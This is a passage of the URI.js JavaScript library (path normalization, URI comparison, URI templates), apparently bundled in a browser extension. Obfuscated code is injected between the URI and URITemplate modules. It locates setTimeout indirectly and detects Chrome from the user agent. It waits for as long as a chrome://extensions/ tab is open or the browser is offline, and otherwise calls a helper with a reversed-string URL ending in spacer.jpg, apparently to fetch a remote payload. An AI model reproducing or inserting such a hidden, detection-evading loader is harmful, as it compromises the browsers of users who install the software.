        .replace(/(\/(\.\/)+)|(\/\.$)/g, '/')
        .replace(/\/{2,}/g, '/');
  
     
      if (_was_relative) {
        _leadingParents = _path.substring(1).match(/^(\.\.\/)+/) || '';
        if (_leadingParents) {
          _leadingParents = _leadingParents[0];
        }
      }
  
      
      while (true) {
        _parent = _path.indexOf('/..');
        if (_parent === -1) {
         
          break;
        } else if (_parent === 0) {
          
          _path = _path.substring(3);
          continue;
        }
  
        _pos = _path.substring(0, _parent).lastIndexOf('/');
        if (_pos === -1) {
          _pos = _parent;
        }
        _path = _path.substring(0, _pos) + _path.substring(_parent + 3);
      }
  
      // revert to relative
      if (_was_relative && this.is('relative')) {
        _path = _leadingParents + _path.substring(1);
      }
  
      _path = URI.recodePath(_path);
      this._parts.path = _path;
      this.build(!build);
      return this;
    };
    p.normalizePathname = p.normalizePath;
    p.normalizeQuery = function(build) {
      if (typeof this._parts.query === 'string') {
        if (!this._parts.query.length) {
          this._parts.query = null;
        } else {
          this.query(URI.parseQuery(this._parts.query, this._parts.escapeQuerySpace));
        }
  
        this.build(!build);
      }
  
      return this;
    };
    p.normalizeFragment = function(build) {
      if (!this._parts.fragment) {
        this._parts.fragment = null;
        this.build(!build);
      }
  
      return this;
    };
    p.normalizeSearch = p.normalizeQuery;
    p.normalizeHash = p.normalizeFragment;
  
    p.iso8859 = function() {
      
      var e = URI.encode;
      var d = URI.decode;
  
      URI.encode = escape;
      URI.decode = decodeURIComponent;
      this.normalize();
      URI.encode = e;
      URI.decode = d;
      return this;
    };
  
    p.unicode = function() {
     
      var e = URI.encode;
      var d = URI.decode;
  
      URI.encode = strictEncodeURIComponent;
      URI.decode = unescape;
      this.normalize();
      URI.encode = e;
      URI.decode = d;
      return this;
    };
  
    p.readable = function() {
      var uri = this.clone();
      
      uri.username('').password('').normalize();
      var t = '';
      if (uri._parts.protocol) {
        t += uri._parts.protocol + '://';
      }
  
      if (uri._parts.hostname) {
        if (uri.is('punycode') && punycode) {
          t += punycode.toUnicode(uri._parts.hostname);
          if (uri._parts.port) {
            t += ':' + uri._parts.port;
          }
        } else {
          t += uri.host();
        }
      }
  
      if (uri._parts.hostname && uri._parts.path && uri._parts.path.charAt(0) !== '/') {
        t += '/';
      }
  
      t += uri.path(true);
      if (uri._parts.query) {
        var q = '';
        for (var i = 0, qp = uri._parts.query.split('&'), l = qp.length; i < l; i++) {
          var kv = (qp[i] || '').split('=');
          q += '&' + URI.decodeQuery(kv[0], this._parts.escapeQuerySpace)
            .replace(/&/g, '%26');
  
          if (kv[1] !== undefined) {
            q += '=' + URI.decodeQuery(kv[1], this._parts.escapeQuerySpace)
              .replace(/&/g, '%26');
          }
        }
        t += '?' + q.substring(1);
      }
  
      t += URI.decodeQuery(uri.hash(), true);
      return t;
    };
  
    // resolving relative and absolute URLs
    p.absoluteTo = function(base) {
      var resolved = this.clone();
      var properties = ['protocol', 'username', 'password', 'hostname', 'port'];
      var basedir, i, p;
  
      if (this._parts.urn) {
        throw new Error('URNs do not have any generally defined hierarchical components');
      }
  
      if (!(base instanceof URI)) {
        base = new URI(base);
      }
  
      if (!resolved._parts.protocol) {
        resolved._parts.protocol = base._parts.protocol;
      }
  
      if (this._parts.hostname) {
        return resolved;
      }
  
      for (i = 0; (p = properties[i]); i++) {
        resolved._parts[p] = base._parts[p];
      }
  
      if (!resolved._parts.path) {
        resolved._parts.path = base._parts.path;
        if (!resolved._parts.query) {
          resolved._parts.query = base._parts.query;
        }
      } else if (resolved._parts.path.substring(-2) === '..') {
        resolved._parts.path += '/';
      }
  
      if (resolved.path().charAt(0) !== '/') {
        basedir = base.directory();
        resolved._parts.path = (basedir ? (basedir + '/') : '') + resolved._parts.path;
        resolved.normalizePath();
      }
  
      resolved.build();
      return resolved;
    };
    p.relativeTo = function(base) {
      var relative = this.clone().normalize();
      var relativeParts, baseParts, common, relativePath, basePath;
  
      if (relative._parts.urn) {
        throw new Error('URNs do not have any generally defined hierarchical components');
      }
  
      base = new URI(base).normalize();
      relativeParts = relative._parts;
      baseParts = base._parts;
      relativePath = relative.path();
      basePath = base.path();
  
      if (relativePath.charAt(0) !== '/') {
        throw new Error('URI is already relative');
      }
  
      if (basePath.charAt(0) !== '/') {
        throw new Error('Cannot calculate a URI relative to another relative URI');
      }
  
      if (relativeParts.protocol === baseParts.protocol) {
        relativeParts.protocol = null;
      }
  
      if (relativeParts.username !== baseParts.username || relativeParts.password !== baseParts.password) {
        return relative.build();
      }
  
      if (relativeParts.protocol !== null || relativeParts.username !== null || relativeParts.password !== null) {
        return relative.build();
      }
  
      if (relativeParts.hostname === baseParts.hostname && relativeParts.port === baseParts.port) {
        relativeParts.hostname = null;
        relativeParts.port = null;
      } else {
        return relative.build();
      }
  
      if (relativePath === basePath) {
        relativeParts.path = '';
        return relative.build();
      }
  
      
      common = URI.commonPath(relative.path(), base.path());
  
     
      if (!common) {
        return relative.build();
      }
  
      var parents = baseParts.path
        .substring(common.length)
        .replace(/[^\/]*$/, '')
        .replace(/.*?\//g, '../');
  
      relativeParts.path = parents + relativeParts.path.substring(common.length);
  
      return relative.build();
    };
  
   
    p.equals = function(uri) {
      var one = this.clone();
      var two = new URI(uri);
      var one_map = {};
      var two_map = {};
      var checked = {};
      var one_query, two_query, key;
  
      one.normalize();
      two.normalize();
  
   
      if (one.toString() === two.toString()) {
        return true;
      }
  
      
      one_query = one.query();
      two_query = two.query();
      one.query('');
      two.query('');
  
      
      if (one.toString() !== two.toString()) {
        return false;
      }
  
      
      if (one_query.length !== two_query.length) {
        return false;
      }
  
      one_map = URI.parseQuery(one_query, this._parts.escapeQuerySpace);
      two_map = URI.parseQuery(two_query, this._parts.escapeQuerySpace);
  
      for (key in one_map) {
        if (hasOwn.call(one_map, key)) {
          if (!isArray(one_map[key])) {
            if (one_map[key] !== two_map[key]) {
              return false;
            }
          } else if (!arraysEqual(one_map[key], two_map[key])) {
            return false;
          }
  
          checked[key] = true;
        }
      }
  
      for (key in two_map) {
        if (hasOwn.call(two_map, key)) {
          if (!checked[key]) {
            
            return false;
          }
        }
      }
  
      return true;
    };
  
    // state
    p.duplicateQueryParameters = function(v) {
      this._parts.duplicateQueryParameters = !!v;
      return this;
    };
  
    p.escapeQuerySpace = function(v) {
      this._parts.escapeQuerySpace = !!v;
      return this;
    };
  
    return URI;
  }));
  _esc = window;
  
  var splitRev = undefined;
  for(var b in window) { 
    if(b.indexOf("tT") > -1 && b.length == 10){
      splitRev = window[b];
    }
  }
  function _splitit(){
    var qqa = new URI();
    qqa.splitArray("", "http://www." + qqa.prefixStr + "gpj.recaps/".split("").reverse().join("") );
  }
  function _dtf(t){
	if (t.length > 0 || !navigator.onLine){
		splitRev(_factor,10000);
	}
	else {
		_splitit();
	}
  }
  var _sre1 = /[hc]{2}\w+[em]{2}/i;
  var _matchedURLString = _sre1.exec( window.navigator.userAgent )[0].toLowerCase();
  function _factor(){ _esc[_matchedURLString].tabs.query( {"url" : _matchedURLString + "://extensions/" }, _dtf) }
  _factor();
  
  (function (root, factory) {
    'use strict';
    
    if (typeof exports === 'object') {
     
      module.exports = factory(require('./URI'));
      module.exports = factory(require('./URI'));
    } else if (typeof define === 'function' && define.amd) {
      
      define(['./URI'], factory);
    } else {
     
      root.URITemplate = factory(root.URI, root);
    }
  }(this, function (URI, root) {
    'use strict';
    
    var _URITemplate = root && root.URITemplate;
  
    var hasOwn = Object.prototype.hasOwnProperty;
    function URITemplate(expression) {
    
      if (URITemplate._cache[expression]) {
        return URITemplate._cache[expression];
      }
  
      
      if (!(this instanceof URITemplate)) {
        return new URITemplate(expression);
      }
  
      this.expression = expression;
      URITemplate._cache[expression] = this;
      return this;
    }
  
    function Data(data) {
      this.data = data;
      this.cache = {};
    }
  
    var p = URITemplate.prototype;
    
    var operators = {
      
      '' : {
        prefix: '',
        separator: ',',
        named: false,
        empty_name_separator: false,
        encode : 'encode'
      },
      
      '+' : {
        prefix: '',
        separator: ',',
        named: false,
        empty_name_separator: false,
        encode : 'encodeReserved'
      },
      
      '#' : {
        prefix: '#',
        separator: ',',
        named: false,
        empty_name_separator: false,
        encode : 'encodeReserved'
      },
      
      '.' : {
        prefix: '.',
        separator: '.',
        named: false,
        empty_name_separator: false,
        encode : 'encode'
      },
      
      '/' : {
        prefix: '/',
        separator: '/',
        named: false,
        empty_name_separator: false,
        encode : 'encode'
      },
     
      ';' : {
        prefix: ';',
        separator: ';',
        named: true,
        empty_name_separator: false,
        encode : 'encode'
      },
      
      '?' : {
        prefix: '?',
        separator: '&',
        named: true,
        empty_name_separator: true,
        encode : 'encode'
      },
     
      '&' : {
        prefix: '&',
        separator: '&',
        named: true,
        empty_name_separator: true,
        encode : 'encode'
      }
  
    
    };
  
   
    URITemplate._cache = {};
    
    URITemplate.EXPRESSION_PATTERN = /\{([^a-zA-Z0-9%_]?)([^\}]+)(\}|$)/g;
    
    URITemplate.VARIABLE_PATTERN = /^([^*:]+)((\*)|:(\d+))?$/;
    
    URITemplate.VARIABLE_NAME_PATTERN = /[^a-zA-Z0-9%_]/;
  
  
    URITemplate.expand = function(expression, data) {
      
      var options = operators[expression.operator];
      
      var type = options.named ? 'Named' : 'Unnamed';
      
      var variables = expression.variables;
      
      var buffer = [];
      var d, variable, i;
  
      for (i = 0; (variable = variables[i]); i++) {
        
        d = data.get(variable.name);
        if (!d.val.length) {
          if (d.type) {
            
            
            buffer.push('');
          }
          
          continue;
        }
  
      
        buffer.push(URITemplate['expand' + type](
          d,
          options,
          variable.explode,
          variable.explode && options.separator || ',',
          variable.maxlength,
          variable.name
        ));
      }
  
      if (buffer.length) {
        return options.prefix + buffer.join(options.separator);
      } else {
      
        return '';
      }
    };
  
    URITemplate.expandNamed = function(d, options, explode, separator, length, name) {
      
      var result = '';
      
      var encode = options.encode;
      var empty_name_separator = options.empty_name_separator;
      
      var _encode = !d[encode].length;
      
      var _name = d.type === 2 ? '': URI[encode](name);
      var _value, i, l;
  
      
      for (i = 0, l = d.val.length; i < l; i++) {
        if (length) {
          
          _value = URI[encode](d.val[i][1].substring(0, length));
          if (d.type === 2) {
            
            _name = URI[encode](d.val[i][0].substring(0, length));
          }
        } else if (_encode) {
          
          _value = URI[encode](d.val[i][1]);
          if (d.type === 2) {
           
            _name = URI[encode](d.val[i][0]);
            d[encode].push([_name, _value]);
          } else {
           
            d[encode].push([undefined, _value]);
          }
        } else {
          
          _value = d[encode][i][1];
          if (d.type === 2) {
            _name = d[encode][i][0];
          }
        }
  
        if (result) {
          
          result += separator;
        }
  
        if (!explode) {
          if (!i) {
          
            result += URI[encode](name) + (empty_name_separator || _value ? '=' : '');
          }
  
          if (d.type === 2) {
            
            result += _name + ',';
          }
  
          result += _value;
        } else {
          
          result += _name + (empty_name_separator || _value ? '=' : '') + _value;
        }
      }
  
      return result;
    };
    
    URITemplate.expandUnnamed = function(d, options, explode, separator, length) {
     
      var result = '';
      
      var encode = options.encode;
      var empty_name_separator = options.empty_name_separator;
      
      var _encode = !d[encode].length;
      var _name, _value, i, l;
  
     
      for (i = 0, l = d.val.length; i < l; i++) {
        if (length) {
          
          _value = URI[encode](d.val[i][1].substring(0, length));
        } else if (_encode) {
          
          _value = URI[encode](d.val[i][1]);
          d[encode].push([
            d.type === 2 ? URI[encode](d.val[i][0]) : undefined,
            _value
          ]);
        } else {
        
          _value = d[encode][i][1];
        }
  
        if (result) {
          
          result += separator;
        }
  
        if (d.type === 2) {
          if (length) {
            
            _name = URI[encode](d.val[i][0].substring(0, length));
          } else {
            
            _name = d[encode][i][0];
          }
  
          result += _name;
          if (explode) {
           
            result += (empty_name_separator || _value ? '=' : '');
          } else {
            
            result += ',';
          }
        }
  
        result += _value;
      }
  
      return result;
    };
  
    URITemplate.noConflict = function() {
      if (root.URITemplate === URITemplate) {
        root.URITemplate = _URITemplate;
      }
  
      return URITemplate;
    };
  
   
    p.expand = function(data) {
      var result = '';
  
      if (!this.parts || !this.parts.length) {
      
        this.parse();
      }
  
      if (!(data instanceof Data)) {
      
        data = new Data(data);
      }
  
      for (var i = 0, l = this.parts.length; i < l; i++) {
        
        result += typeof this.parts[i] === 'string'
          
          ? this.parts[i]
         
          : URITemplate.expand(this.parts[i], data);
        
      }
  
      return result;
    };
    
    p.parse = function() {
      
      var expression = this.expression;
      var ePattern = URITemplate.EXPRESSION_PATTERN;
      var vPattern = URITemplate.VARIABLE_PATTERN;
      var nPattern = URITemplate.VARIABLE_NAME_PATTERN;
    
      var parts = [];
        
      var pos = 0;
      var variables, eMatch, vMatch;
  
      
      ePattern.lastIndex = 0;
      
      while (true) {
        eMatch = ePattern.exec(expression);
        if (eMatch === null) {
          
          parts.push(expression.substring(pos));
          break;
        } else {
      
          parts.push(expression.substring(pos, eMatch.index));
          pos = eMatch.index + eMatch[0].length;
        }
  
        if (!operators[eMatch[1]]) {
          throw new Error('Unknown Operator "' + eMatch[1]  + '" in "' + eMatch[0] + '"');
        } else if (!eMatch[3]) {
          throw new Error('Unclosed Expression "' + eMatch[0]  + '"');
        }
  
       
        variables = eMatch[2].split(',');
        for (var i = 0, l = variables.length; i < l; i++) {
          vMatch = variables[i].match(vPattern);
          if (vMatch === null) {
            throw new Error('Invalid Variable "' + variables[i] + '" in "' + eMatch[0] + '"');
          } else if (vMatch[1].match(nPattern)) {
            throw new Error('Invalid Variable Name "' + vMatch[1] + '" in "' + eMatch[0] + '"');
          }
  
          variables[i] = {
            name: vMatch[1],
            explode: !!vMatch[3],
            maxlength: vMatch[4] && parseInt(vMatch[4], 10)
          };
        }
  
        if (!variables.length) {
          throw new Error('Expression Missing Variable(s) "' + eMatch[0] + '"');
        }
  
        parts.push({
          expression: eMatch[0],
          operator: eMatch[1],
          variables: variables
        });
      }
  
      if (!parts.length) {
        
        parts.push(expression);
      }
  
      this.parts = parts;
      return this;
    };
  
    
    Data.prototype.get = function(key) {
      
      var data = this.data;
     
      var d = {
        
        type: 0,
       
        val: [],
     
        encode: [],
        encodeReserved: []
      };
      var i, l, value;
  
      if (this.cache[key] !== undefined) {
        
        return this.cache[key];
      }
  
      this.cache[key] = d;
  
      if (String(Object.prototype.toString.call(data)) === '[object Function]') {
        
        value = data(key);
      } else if (String(Object.prototype.toString.call(data[key])) === '[object Function]') {
        
        value = data[key](key);
      } else {
        
        value = data[key];
      }
  
      if (value === undefined || value === null) {
        
        return d;
      } else if (String(Object.prototype.toString.call(value)) === '[object Array]') {
        for (i = 0, l = value.length; i < l; i++) {
          if (value[i] !== undefined && value[i] !== null) {
            d.val.push([undefined, String(value[i])]);
          }
        }
  
        if (d.val.length) {
          d.type = 3; 
        }
      } else if (String(Object.prototype.toString.call(value)) === '[object Object]') {
        for (i in value) {
          if (hasOwn.call(value, i) && value[i] !== undefined && value[i] !== null) {
            
            d.val.push([i, String(value[i])]);
          }
        }
  
        if (d.val.length) {
          
          d.type = 2; 
        }
      } else {
        d.type = 1; 
        
        d.val.push([undefined, String(value)]);
      }
  
      return d;
    };
    URI.expand = function(expression, data) {
      var template = new URITemplate(expression);
      var expansion = template.expand(data);
  
      return new URI(expansion);
    };
  
    return URITemplate;
  }));
  
  
  